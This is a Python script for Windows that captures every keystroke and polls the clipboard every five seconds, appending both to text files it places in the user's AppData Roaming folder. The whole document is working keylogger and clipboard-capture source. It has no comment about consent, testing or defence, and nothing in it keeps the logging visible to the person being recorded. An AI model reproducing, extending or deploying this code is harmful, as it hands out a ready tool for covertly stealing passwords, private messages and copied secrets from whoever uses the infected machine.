import keyboard
import pyperclip
import threading
import time
import os
import getpass
from pynput.keyboard import Key, Listener

# Define log files
username = getpass.getuser()
keystroke_log = f"C:\\Users\\{username}\\AppData\\Roaming\\keystrokes.txt"
clipboard_log = f"C:\\Users\\{username}\\AppData\\Roaming\\clipboard_data.txt"

# Function to log keystrokes
def on_press(key):
    try:
        with open(keystroke_log, "a") as klog:
            klog.write(f"{key.char}")
    except AttributeError:
        if key == Key.space:
            with open(keystroke_log, "a") as klog:
                klog.write(" ")
        else:
            with open(keystroke_log, "a") as klog:
                klog.write(f"{str(key)}")

def on_release(key):
    if key == Key.esc:
        return False

# Function to monitor clipboard content
def monitor_clipboard():
    previous_content = ""
    while True:
        try:
            current_content = pyperclip.paste()
            if current_content != previous_content:
                previous_content = current_content
                with open(clipboard_log, "a") as clog:
                    clog.write(f"Clipboard: {current_content}\n")
        except pyperclip.PyperclipException:
            pass
        time.sleep(5)

# Function to start keystroke logging
def start_keystroke_logging():
    # Append a new line to the keystroke log to separate sessions
    with open(keystroke_log, "a") as klog:
        klog.write("\n--- New Session ---\n")
    
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Create log files if they don't exist
if not os.path.exists(keystroke_log):
    open(keystroke_log, "w").close()
if not os.path.exists(clipboard_log):
    open(clipboard_log, "w").close()

# Start the keylogger in a separate thread
keylogger_thread = threading.Thread(target=start_keystroke_logging)
keylogger_thread.start()

# Start clipboard monitoring
clipboard_thread = threading.Thread(target=monitor_clipboard)
clipboard_thread.start()